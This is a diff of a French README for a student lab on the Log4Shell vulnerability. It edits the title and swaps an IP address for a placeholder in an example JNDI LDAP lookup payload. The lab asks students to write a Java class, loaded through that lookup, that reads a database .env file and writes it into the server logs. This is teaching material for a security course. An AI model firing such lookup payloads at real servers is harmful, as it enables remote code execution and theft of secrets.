@@ -1,4 +1,4 @@
-# Sujet - TP Log4Shell - Ne fonctionne pas pour le moment !!!
+# Sujet - TP Log4Shell 
 ### BERTRAND Timothé - BLANC Olivier - PAYS Antoine - GENIN Fabien
 ### A rendre pour le jeudi 10 février 2022 23H59
 
@@ -36,7 +36,7 @@ Etapes à reproduire pour la réalisation du tp :
 Créer un fichier java dans lequel le code devra récupérer et écrire le .env de la base de données dans les logs du serveur.
 Appeler votre class java dans une requete faite au serveur, grace à un lookup vu en cours.
 
-Exemple de lookup : "${jndi:ldap://172.22.0.5:9999/WithReturn}"
+Exemple de lookup : "${jndi:ldap://<ipserver>:9999/WithReturn}"
 
 ## Vous pourrez trouver des exemples d'attaques dans le fichier "attacker.java"
 
